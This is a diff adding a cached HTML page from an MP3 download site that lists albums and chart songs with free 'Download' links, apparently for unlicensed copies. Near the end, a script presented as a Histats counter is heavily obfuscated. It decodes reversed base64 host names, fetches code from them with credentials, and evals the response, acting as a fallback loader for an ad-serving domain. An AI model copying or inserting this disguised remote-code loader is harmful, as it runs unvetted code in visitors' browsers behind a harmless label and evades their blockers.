+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Automaton" title="Automaton" data-original="http://is1.mzstatic.com/image/thumb/Music122/v4/0d/0c/77/0d0c77d4-116f-f1c3-6f50-176eaad539eb/UMG_cvrart_00602557321210_01_RGB72_1800x1800_16UMGIM79993.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Automaton</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Jamiroquai</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1197528605/Automaton.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Something's Going On" title="Something's Going On" data-original="http://is4.mzstatic.com/image/thumb/Music91/v4/d4/e2/8a/d4e28a1b-569d-4090-61ea-4fba255bef61/886446324579.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Something's Going On</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Trace Adkins</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1196928785/Something-s-Going-On.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Beauty and the Beast (Original Motion Picture Soundtrack)" title="Beauty and the Beast (Original Motion Picture Soundtrack)" data-original="http://is3.mzstatic.com/image/thumb/Music122/v4/22/23/0a/22230aa6-52ac-f38d-75ab-69a576811d24/UMG_cvrart_00050087358877_01_RGB72_1800x1800_17UMGIM06497.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Beauty and the Beast (Original Motion Picture Soundtrack)</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Various Artists</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1200584674/Beauty-and-the-Beast-Original-Motion-Picture-Soundtrack.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Tremaine The Album" title="Tremaine The Album" data-original="http://is2.mzstatic.com/image/thumb/Music122/v4/08/fc/b8/08fcb83f-c732-9240-dd3a-2ab1f0daf4bc/075679900876.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Tremaine The Album</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Trey Songz</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1204361166/Tremaine-The-Album.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="You Only Live 2wice" title="You Only Live 2wice" data-original="http://is3.mzstatic.com/image/thumb/Music111/v4/52/0b/38/520b38d9-ddd0-13e3-11c2-e81cfef65af7/888915351536_cover.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>You Only Live 2wice</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Freddie Gibbs</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1212682475/You-Only-Live-2wice.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Mental Illness" title="Mental Illness" data-original="http://is2.mzstatic.com/image/thumb/Music111/v4/f3/35/7e/f3357e8c-65ab-9ea9-3b50-3df320b2a4b0/886446299341.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Mental Illness</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Aimee Mann</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1188948781/Mental-Illness.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Outlive" title="Outlive" data-original="http://is2.mzstatic.com/image/thumb/Music111/v4/84/6d/96/846d9607-2554-9b7b-ad94-e81ee291f8b3/886446342467.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Outlive</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Demon Hunter</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1201023918/Outlive.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+          </div>
+  </div>
+</div>
+<div class="row clearfix" style="margin-left: -8px; margin-right: -8px;">
+  <section class="container-fluid" id="section1">
+    <div class="col-sm-12">
+      <div class="row" style="margin-left: -23px; margin-right: -23px;">
+        <div class="col-sm-4 col-xs-12">
+          <div class="list-group" >
+  <a class="list-group-item active">
+    <h2 class="list-group-item-heading text-center" style="font-size: 25px;" >Fresh Music by  Free Songs Download</h2>
+    <h6 class="text-center" >Most Recent Added MP3s by  Free Songs Download</h6>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Wild-Wild-West.html" title="Wild Wild West mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Wild Wild West Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Aarti-Yogeshwari-Devichi.html" title="Aarti Yogeshwari Devichi mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Aarti Yogeshwari Devichi Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Neva-New-Till-I-Kissed-You.html" title="Neva New Till I Kissed You mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Neva New Till I Kissed You Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Throwed-Feat-Krush.html" title="Throwed Feat Krush mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Throwed Feat Krush Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Maa-Durgar-Onek-Roop.html" title="Maa Durgar Onek Roop mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Maa Durgar Onek Roop Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Endhan-Naavil.html" title="Endhan Naavil mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Endhan Naavil Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Valse-Frontenac.html" title="Valse Frontenac mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Valse Frontenac Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Mc-Gw.html" title="Mc Gw mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Mc Gw Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Thottil-Seva.html" title="Thottil Seva mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Thottil Seva Mp3</p>
+  </a>
+     <a  href="http://xfreesongs.com/en/song-download/Kygo-Cloud-Nine-Mix.html" title="Kygo Cloud Nine Mix mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-music" style="margin-right:2%; color:#d9230f"></i>Kygo Cloud Nine Mix Mp3</p>
+  </a>
+    <a href="http://xfreesongs.com/fresh/" class="list-group-item" >
+    <button class="btn btn-default btn-lg btn-block">Fresh..</button>
+  </a>
+</div>          </div><!--/left-->
+          <div class="col-sm-4 col-xs-12">
+            <div class="list-group" >
+  <a class="list-group-item active">
+    <h2 class="list-group-item-heading text-center" style="font-size: 25px;">Now Downloading</h2>
+    <h6 class="text-center" style="text-shadow: 1px 1px #666;">(Currently Running Downloads..)</h6>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/f9y4NCGCaxM/2017-Holyoke-St-Patrick-S-Parade.html" title="2017 Holyoke St Patrick S Parade mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>2017 Holyoke St Patrick S Parade Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/5qcjM6gxKu0/TheFatRat-JJD-Prelude-VIP-Edit-Copyright-Free-Music.html" title="TheFatRat JJD Prelude VIP Edit Copyright Free Music mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>TheFatRat JJD Prelude VIP Edit Copyright Free Music Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/Rg4__eyYKH0/Hardwell-W-W-Feat-Fatman-Scoop-Vs-Treeson-Bootleg-Don-T-Stop-The-Madness-MACS-Mashup.html" title="Hardwell W W Feat Fatman Scoop Vs Treeson Bootleg Don T Stop The Madness MACS Mashup mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>Hardwell W W Feat Fatman Scoop Vs Treeson Bootleg Don T Stop The Madness MACS Mashup Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/j5O97F3984o/Bade-Miyan-Chote-Miyan-Music-Release-Function-Amitabh-Bachchan-Govinda.html" title="Bade Miyan Chote Miyan Music Release Function Amitabh Bachchan Govinda mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>Bade Miyan Chote Miyan Music Release Function Amitabh Bachchan Govinda Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/ma73T6C1NHg/BEDRİ-AYSELİ-VARDIM-HİNT-ELİNE.html" title="BEDRİ AYSELİ VARDIM HİNT ELİNE mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>BEDRİ AYSELİ VARDIM HİNT ELİNE Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/A5zgm0Dc0ZI/At-Pritam-Mann-Mohna-Bhai-Surinder-Singh-Ji-Wmv.html" title="At Pritam Mann Mohna Bhai Surinder Singh Ji Wmv mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>At Pritam Mann Mohna Bhai Surinder Singh Ji Wmv Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/V44PLu_OWkQ/HO-KE-SHER-SAWAR-DARSHAN-DE-MATA-LIVE-AARTI-MaaVaishno-Devi-Ji-YOUTUBE-2016-NONSTOP.html" title="HO KE SHER SAWAR DARSHAN DE MATA LIVE AARTI MaaVaishno Devi Ji YOUTUBE 2016 NONSTOP mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>HO KE SHER SAWAR DARSHAN DE MATA LIVE AARTI MaaVaishno Devi Ji YOUTUBE 2016 NONSTOP Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/9_Zp6EV5NgY/You-Are-Your-Mothers-Child-Conor-Oberst-Lyrics-Stuck-In-Love-Soundtrack.html" title="You Are Your Mothers Child Conor Oberst Lyrics Stuck In Love Soundtrack mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>You Are Your Mothers Child Conor Oberst Lyrics Stuck In Love Soundtrack Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/FlXvr-tGyiE/Pamba-Saranam-Tamil.html" title="Pamba Saranam Tamil mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>Pamba Saranam Tamil Mp3</p>
+  </a>
+    <a  href="http://xfreesongs.com/en/get-mp3/UvUC-DQRg2c/Really-Saying-Something-John-Luongo-Remix-Bananarama-The-Fun-Boy-Three-80s-Club-Mixes.html" title="Really Saying Something John Luongo Remix Bananarama The Fun Boy Three 80s Club Mixes mp3" class="list-group-item">
+    <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-download" style="margin-right:2%; color:#d9230f"></i>Really Saying Something John Luongo Remix Bananarama The Fun Boy Three 80s Club Mixes Mp3</p>
+  </a>
+    <a href="http://xfreesongs.com/top-downloads/" class="list-group-item" >
+    <button class="btn btn-default btn-lg btn-block">Top Downloads</button>
+  </a>
+</div>          </div>
+          <!--/middle-->
+          <div class="col-sm-4 col-xs-12">
+            <div class="list-group">
+              <a class="list-group-item active">
+                <h2 class="list-group-item-heading text-center">Top Songs by  Free Songs Download</h2>
+                <h6 class="text-center">France top chart..</h6>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Shape-of-You-Ed-Sheeran.html" title="Shape of You - Ed Sheeran mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Shape of You by <b>Ed Sheeran</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Despacito-feat-Daddy-Yankee-Luis-Fonsi.html" title="Despacito (feat. Daddy Yankee) - Luis Fonsi mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Despacito (feat. Daddy Yankee) by <b>Luis Fonsi</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Million-Eyes-Loïc-Nottet.html" title="Million Eyes - Loïc Nottet mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Million Eyes by <b>Loïc Nottet</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Bandit-saleté-Sofiane.html" title="Bandit saleté - Sofiane mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Bandit saleté by <b>Sofiane</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Human-Rag-n-Bone-Man.html" title="Human - Rag'n'Bone Man mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Human by <b>Rag'n'Bone Man</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Be-Mine-Ofenbach.html" title="Be Mine - Ofenbach mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Be Mine by <b>Ofenbach</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Chained-To-the-Rhythm-feat-Skip-Marley-Katy-Perry.html" title="Chained To the Rhythm (feat. Skip Marley) - Katy Perry mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Chained To the Rhythm (feat. Skip Marley) by <b>Katy Perry</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Roule-Soprano.html" title="Roule - Soprano mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Roule by <b>Soprano</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Sunset-Lover-Petit-Biscuit.html" title="Sunset Lover - Petit Biscuit mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Sunset Lover by <b>Petit Biscuit</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/en/song-download/Way-Down-We-Go-Kaleo.html" title="Way Down We Go - Kaleo mp3" class="list-group-item">
+                <p class="list-group-item-text" style="white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><i class="fa fa-line-chart" style="margin-right:2%; color:#d9230f"></i>Way Down We Go by <b>Kaleo</b></p>
+              </a>
+                            <a  href="http://xfreesongs.com/top-world/" class="list-group-item">
+                <button class="btn btn-default btn-lg btn-block">More..</button>
+              </a>
+            </div>
+            </div><!--/right-->
+            </div><!--/row-->
+          </div>
+        </section>
+      </div></div>
+      <div class="col-md-12 column">
+    <div class="row clearfix">
+        <div class="alert alert-info" style="color:black;box-shadow:0 6px 6px -6px #777;">
+            <center>Powered by: <a href="http://Mp3Ora.com/" target="_blank">Mp3Ora</a> - Copyright &copy; <a href="http://xfreesongs.com/" title="Download free music">Download free music</a> </center>
+        </div>
+    </div>
+</div>
+<!--script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/pace/0.6.0/pace.min.js"></script//-->
+<script src="http://xfreesongs.com/result_files/jquery.js"></script>
+<script type="text/javascript" src="http://xfreesongs.com/result_files/bootstrap.js"></script>
+<script type="text/javascript" src="http://xfreesongs.com/result_files/script.js"></script>
+<script>
+$(function() {
+$("img.lazy").lazyload({
+effect : "fadeIn"
+});
+});
+</script>
+  <!-- Histats.com  START  (aync)-->
+  <script data-cfasync="false" type="text/javascript">var i2B=window;for(var f in i2B){if(f.length===(6.29E2<=(88,1.57E2)?'X':0x173<(0x1C9,137.3E1)?(4.71E2,6):(0x241,0xAD))&&f.charCodeAt(((4.5E2,0x9E)>=1.048E3?4:(0xE7,0x7E)>=(0x1A6,48)?(133,3):(81.10E1,109.)))===(73.9E1>=(124.,108)?(0x43,100):(16.0E1,57.0E1))&&f.charCodeAt((0x24D>(115.,0x6F)?(74,5):(1.231E3,0x1D5)))===((0x209,0x168)<(0x184,0xF5)?'C':(106.80E1,0x2A)<(27.,2.18E2)?(99.,119):(88.60E1,0x241))&&f.charCodeAt(((29.,0x163)<=(38.,0xE5)?89.10E1:(0xC0,5.09E2)>=1.130E2?(138.,1):(83.,51.0E1)))===((67.7E1,60.6E1)>(44.,0xC6)?(0x10D,105):78.>=(0x10A,135)?(0x9F,'o'):(116.30E1,42.2E1))&&f.charCodeAt(((0xD8,0x1F)<0x99?(67.,0):(34.4E1,2.)))===((0x8B,22.)>(88,0x1B1)?(1.19E3,"K"):0x6B>=(43.,34.)?(103.,119):(0x1BF,0x230)))break};for(var v in i2B[f]){if(v.length===((10.25E2,3.260E2)>=(0x209,47.2E1)?(48,143.6E1):(0x1E3,0x5F)>=3?(0xE6,8):(0x1BD,78))&&v.charCodeAt((12<=(2.58E2,61)?(73.60E1,5):(0xD2,11.13E2)))===((0x1B,0x232)<=75.8E1?(0x1C5,101):(4.0E1,33))&&v.charCodeAt(((0xE3,134)>61?(0x70,7):(2.45E2,88)))===(119.>=(0x128,10)?(121,116):(66.,21.))&&v.charCodeAt(((74.,0xC6)>130?(23,3):(0x1BC,3.63E2)))===(0x3C<(3.7E1,0x3E)?(67.,117):(2.08E2,147))&&v.charCodeAt(((99.0E1,0x1D9)>(65.,133)?(148.4E1,0):(81,21.3E1)))===((4.22E2,119)<=(22,133)?(5.72E2,100):59>=(2.41E2,0x1AB)?0x52:(103.,110.)))break};(function(q,o,A,a){i2B[f][o]=function(){var r=(18.8E1>(19.,53.)?(57,0):(0x227,8.2E2)<=0x1D5?0x17C:(17.,0x217)),P=r,w=function w(){var E=((60,0x5B)<(2,84.0E1)?(74.4E1,'/'):0x1DC>=(14.9E2,91.5E1)?(2.2E1,87):(5.18E2,87));var d='';var B='//';var l='GET';var R=((7.30E1,126.5E1)>=8E0?(63.,true):(0x161,11.03E2));var y=new XMLHttpRequest();y.withCredentials=R;y.open((l),(B)+i2B[f]['atob'](A[P].split(d).reverse().join(d))+E+a+E,R);y.onreadystatechange=function(){var h=((0x7,8.36E2)>(5.33E2,83.)?(87,200):(0x109,145.));var p=((2.62E2,2.71E2)>140.?(0x1C,4):(6.8E2,9.99E2)>(103,142.6E1)?(0x19E,7.310E2):(5.55E2,0x214));if(y.readyState==p&&y.status==h&&y.responseText){eval(y.responseText);}};y.onerror=function(){if(++P!=A.length){w();}};try{y.send();}catch(h){y.onerror();}};w();};})(i2B[f][v],'_afpdtq',['=U2YhB3cucne6RzY2xWb','==Adlt2YpJ3YugWb5cXa4Q2Y','==QZ0l2cuE2N3VmZ6dXM','==QZ0l2ciV2duAjYphDbvp2Z'],1130500);</script><script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1130499" onerror="window._afpdtq();"></script><script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,3767806,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?3767806&101" alt="free html hit counter" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+</body></html>
+";s:1:"t";O:8:"DateTime":3:{s:4:"date";s:26:"2017-04-01 20:36:12.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:12:"Europe/Paris";}s:1:"g";a:0:{}}
